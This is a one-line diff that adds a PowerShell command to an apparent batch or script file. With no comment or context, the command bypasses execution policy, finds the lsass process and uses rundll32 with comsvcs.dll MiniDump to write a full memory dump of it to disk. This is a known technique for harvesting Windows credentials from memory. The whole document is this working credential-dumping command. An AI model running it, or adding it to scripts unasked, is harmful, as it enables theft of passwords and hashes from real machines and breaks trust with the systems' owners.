@@ -1,0 +1,1 @@
+powershell.exe -ExecutionPolicy Bypass -Command "$myPid = (Get-Process lsass).Id; Write-Host ('lsass PID: ' + $myPid); rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump $myPid '%~dp0lsAss.dmp' full"
